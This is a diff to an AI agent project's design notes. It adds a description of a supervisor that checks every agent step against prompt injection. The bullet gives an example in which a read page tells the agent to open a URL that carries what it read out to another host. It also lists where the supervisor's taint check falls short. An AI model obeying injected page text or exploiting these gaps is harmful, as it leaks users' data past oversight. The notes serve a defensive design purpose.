@@ -65,6 +65,17 @@ Moved unchanged from `CLAUDE.md` on 2026-10-06, when CLAUDE.md was cut to its co
   unit-tested offline; in `orchestrator._build_agent_brain` it's backed by
   `provider.answer` on the smart (or fast) tier. Persisted via the `agent_runs`
   AgentContext field.
+- **Every step of a run is put to the supervisor first** (`supervisor.py`, wired in
+  `orchestrator._supervised`). The gate judges one action as its tool describes it, and MEDIUM
+  runs with no card in the web app, so a run that had read a page could be told by it to
+  `open url https://elsewhere/?q=<what it read>` and nothing asked. The supervisor holds the
+  run's memory: reading outside text taints the run, and a tainted run is asked (at HIGH,
+  through the gate) before a `GUARDED` or unlisted step; `DIRECT` commands are refused and not
+  listed in the prompt; a third identical step or a second refusal raises `RunStopped`, which
+  the loop returns as the run's answer instead of a failed step. Rules only: a model judging
+  injected text can be talked round by it. Known limits: the conversation context is not a
+  taint source, queries to fixed services (search, weather) are not treated as sending out,
+  and what an approved program does is outside it.
 - **The agent trusts a reply only up to its first runnable ACTION** (`parse_agent_decision`).
   The model writes ACTION, an OBSERVATION it made up and a FINAL built on it, all in one
   reply, and FINAL used to win: runs ended on a README summary of a file that does not
